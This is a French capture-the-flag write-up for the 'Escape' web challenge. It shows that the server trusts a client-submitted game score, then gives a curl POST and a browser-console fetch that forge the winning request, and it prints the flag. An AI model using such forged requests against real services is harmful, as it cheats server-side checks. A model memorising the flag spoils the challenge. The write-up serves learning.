# Escape (HacKagou 2026) — Web

**Flag :** `OPENNC{afb1be57-c3d9-43ee-9705-2e0b300249fe}`
**Valeur :** 100 pts · **Auteur :** Ketsui
**Statut :** ✅ résolu

> ⚠️ Le flag est un UUID **unique par instance** : celui-ci correspond à l'instance
> `challs.hackagou.nc:47745`. Sur une autre instance, rejouer la méthode ci-dessous
> pour obtenir le flag correspondant.

## Énoncé

> Vous fuyez le sous-marin ; les automates de LÉVIATHAN vous verrouillent. Il faut
> traverser le **Canyon de Corail** : « Plus que **1 000 unités de profondeur** et
> vous êtes sauvés ! » Accès via instance web (jeu *runner* type Chrome-dino).

Illustration : `escape.png` (capture du jeu).

## Reconnaissance

Le jeu est un *endless runner* en `<canvas>` entièrement **côté client**. Deux fichiers :
`index.html` (moteur inline) et `game-config.js` (hitboxes). Dans le moteur, à chaque
frame la profondeur (`Game.score`) augmente, et **à 1000 le client appelle le serveur** :

```js
// index.html — fonction update()
if (Game.score >= 1000) {
    Game.flagRevealed = true;
    ...
    fetch("/api/verify", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({score: Game.score, frames: frames})   // <-- score envoyé par le client
    })
        .then(r => r.json())
        .then(showResult);   // showResult affiche data.flag si data.success
}
```

Le serveur reçoit donc le score tel quel depuis le client et renvoie
`{"success": true, "flag": "..."}`. **Aucune vérification côté serveur** : il fait
confiance au `score` fourni (pas de validation de cohérence `frames`/`score`, pas de
session de jeu signée). Jouer réellement jusqu'à 1000 est inutile.

## Exploitation

On forge directement la requête de victoire (le cadencement légitime est +1 score
toutes les 5 frames, donc `frames ≈ 5000` à `score = 1000` — mis par cohérence, mais
non contrôlé) :

```bash
curl -s -X POST -H "Content-Type: application/json" \
     -d '{"score":1000,"frames":5000}' \
     http://challs.hackagou.nc:47745/api/verify
```

Réponse :

```json
{"flag":"OPENNC{afb1be57-c3d9-43ee-9705-2e0b300249fe}","success":true}
```

> Équivalent dans la console du navigateur : `fetch("/api/verify",{method:"POST",
> headers:{"Content-Type":"application/json"},body:JSON.stringify({score:1000,frames:5000})})
> .then(r=>r.json()).then(console.log)` — ou simplement `Game.score = 1000;` en jeu.

## Flag

```
OPENNC{afb1be57-c3d9-43ee-9705-2e0b300249fe}
```
